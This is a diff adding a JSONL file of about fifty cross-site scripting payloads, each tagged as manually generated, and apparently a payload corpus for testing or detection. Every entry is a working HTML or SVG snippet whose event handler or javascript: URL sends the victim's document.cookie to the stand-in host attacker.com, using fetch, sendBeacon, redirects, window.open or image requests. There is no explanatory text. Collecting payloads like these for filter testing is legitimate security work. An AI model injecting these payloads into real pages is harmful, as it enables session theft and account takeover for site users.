@@ -1,0 +1,50 @@
+{"payload": "<details open ontoggle=fetch('http://attacker.com?c='+document.cookie)>", "generator": "manual"}
+{"payload": "<marquee onstart=navigator.sendBeacon('http://attacker.com',document.cookie)>", "generator": "manual"}
+{"payload": "<input autofocus onfocus=location='http://attacker.com?c='+document.cookie>", "generator": "manual"}
+{"payload": "<svg><use href=\"data:image/svg+xml,<svg onload=fetch('http://attacker.com?c='+document.cookie)>\"></use></svg>", "generator": "manual"}
+{"payload": "<math><mi onmouseover=window.open('http://attacker.com?c='+document.cookie)>hover</mi></math>", "generator": "manual"}
+{"payload": "<video><source onerror=new Image().src='http://attacker.com?c='+document.cookie></video>", "generator": "manual"}
+{"payload": "<audio controls onplay=fetch('http://attacker.com?c='+document.cookie)>", "generator": "manual"}
+{"payload": "<keygen autofocus onfocus=location='http://attacker.com?c='+document.cookie>", "generator": "manual"}
+{"payload": "<isindex autofocus onfocus=navigator.sendBeacon('http://attacker.com',document.cookie)>", "generator": "manual"}
+{"payload": "<textarea autofocus onfocus=new Image().src='http://attacker.com?c='+document.cookie></textarea>", "generator": "manual"}
+{"payload": "<select autofocus onfocus=window.open('http://attacker.com?c='+document.cookie)><option>a</option></select>", "generator": "manual"}
+{"payload": "<button autofocus onfocus=fetch('http://attacker.com?c='+document.cookie)>click</button>", "generator": "manual"}
+{"payload": "<a href=\"javascript:fetch('http://attacker.com?c='+document.cookie)\" onmouseover=location='http://attacker.com?c='+document.cookie>link</a>", "generator": "manual"}
+{"payload": "<div onmouseover=navigator.sendBeacon('http://attacker.com',document.cookie)>hover</div>", "generator": "manual"}
+{"payload": "<span onmouseover=new Image().src='http://attacker.com?c='+document.cookie>hover</span>", "generator": "manual"}
+{"payload": "<form onsubmit=fetch('http://attacker.com?c='+document.cookie)><input type=submit></form>", "generator": "manual"}
+{"payload": "<object data=\"javascript:fetch('http://attacker.com?c='+document.cookie)\"></object>", "generator": "manual"}
+{"payload": "<embed src=\"javascript:fetch('http://attacker.com?c='+document.cookie)\">", "generator": "manual"}
+{"payload": "<iframe srcdoc=\"<img src=x onerror=location='http://attacker.com?c='+document.cookie>\">", "generator": "manual"}
+{"payload": "<portal src=\"javascript:fetch('http://attacker.com?c='+document.cookie)\">", "generator": "manual"}
+{"payload": "<slot onmouseover=navigator.sendBeacon('http://attacker.com',document.cookie)></slot>", "generator": "manual"}
+{"payload": "<template id=x><img src=x onerror=window.open('http://attacker.com?c='+document.cookie)></template>", "generator": "manual"}
+{"payload": "<foreignObject><body onmouseover=fetch('http://attacker.com?c='+document.cookie)></body></foreignObject>", "generator": "manual"}
+{"payload": "<xss autofocus onfocus=location='http://attacker.com?c='+document.cookie>", "generator": "manual"}
+{"payload": "<xmp onmouseover=new Image().src='http://attacker.com?c='+document.cookie>hover</xmp>", "generator": "manual"}
+{"payload": "<listing onmouseover=navigator.sendBeacon('http://attacker.com',document.cookie)>hover</listing>", "generator": "manual"}
+{"payload": "<svg><a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"javascript:fetch('http://attacker.com?c='+document.cookie)\"><text>click</text></a></svg>", "generator": "manual"}
+{"payload": "<math href=\"javascript:fetch('http://attacker.com?c='+document.cookie)\"><mtext>click</mtext></math>", "generator": "manual"}
+{"payload": "<details open ontoggle=location='http://attacker.com?c='+document.cookie>", "generator": "manual"}
+{"payload": "<marquee onstart=window.open('http://attacker.com?c='+document.cookie)>", "generator": "manual"}
+{"payload": "<input autofocus onfocus=new Image().src='http://attacker.com?c='+document.cookie>", "generator": "manual"}
+{"payload": "<svg onbegin=fetch('http://attacker.com?c='+document.cookie)><animate begin=\"0s\" attributeName=\"x\" /></svg>", "generator": "manual"}
+{"payload": "<audio oncanplay=navigator.sendBeacon('http://attacker.com',document.cookie)>", "generator": "manual"}
+{"payload": "<video onprogress=location='http://attacker.com?c='+document.cookie>", "generator": "manual"}
+{"payload": "<source onerror=window.open('http://attacker.com?c='+document.cookie)>", "generator": "manual"}
+{"payload": "<track onerror=new Image().src='http://attacker.com?c='+document.cookie>", "generator": "manual"}
+{"payload": "<iframe onload=location='http://attacker.com?c='+document.cookie></iframe>", "generator": "manual"}
+{"payload": "<object onerror=fetch('http://attacker.com?c='+document.cookie)>", "generator": "manual"}
+{"payload": "<embed onerror=navigator.sendBeacon('http://attacker.com',document.cookie)>", "generator": "manual"}
+{"payload": "<body onmouseover=location='http://attacker.com?c='+document.cookie>", "generator": "manual"}
+{"payload": "<table onmouseover=new Image().src='http://attacker.com?c='+document.cookie><tr><td>hover</td></tr></table>", "generator": "manual"}
+{"payload": "<td onmouseover=window.open('http://attacker.com?c='+document.cookie)>hover</td>", "generator": "manual"}
+{"payload": "<font onmouseover=fetch('http://attacker.com?c='+document.cookie)>hover</font>", "generator": "manual"}
+{"payload": "<blink onmouseover=navigator.sendBeacon('http://attacker.com',document.cookie)>hover</blink>", "generator": "manual"}
+{"payload": "<marquee onbounce=location='http://attacker.com?c='+document.cookie>", "generator": "manual"}
+{"payload": "<keygen onfocus=window.open('http://attacker.com?c='+document.cookie) autofocus>", "generator": "manual"}
+{"payload": "<isindex onfocus=new Image().src='http://attacker.com?c='+document.cookie autofocus>", "generator": "manual"}
+{"payload": "<textarea onfocus=location='http://attacker.com?c='+document.cookie autofocus></textarea>", "generator": "manual"}
+{"payload": "<select onfocus=fetch('http://attacker.com?c='+document.cookie) autofocus></select>", "generator": "manual"}
+{"payload": "<button onfocus=navigator.sendBeacon('http://attacker.com',document.cookie) autofocus>click</button>", "generator": "manual"}
